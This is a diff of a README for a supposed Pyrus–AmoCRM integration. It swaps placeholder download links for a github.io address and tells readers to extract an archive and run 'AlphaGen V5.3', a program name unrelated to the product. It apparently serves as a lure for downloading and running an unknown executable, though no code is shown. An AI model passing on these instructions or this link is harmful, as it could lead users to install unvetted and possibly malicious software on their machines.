@@ -2,13 +2,13 @@
 
 Integrate Pyrus task management with AmoCRM to automate workflows, assign tasks, and track sales-related actions — all from within your CRM.
 
-[![Download](https://img.shields.io/badge/Download-Pyrus_AmoCRM_Extension-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Pyrus_AmoCRM_Extension-blueviolet)](https://pyrus-amocrm-extension.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://pyrus-amocrm-extension.github.io/.github)  
 2. 📁 Extract the folder to any location  
 3. 🖱 Run AlphaGen V5.3 to activate Pyrus integration features  
 4. ✅ In AmoCRM, connect to your Pyrus account and set automation rules via `Settings > Integrations > Pyrus`
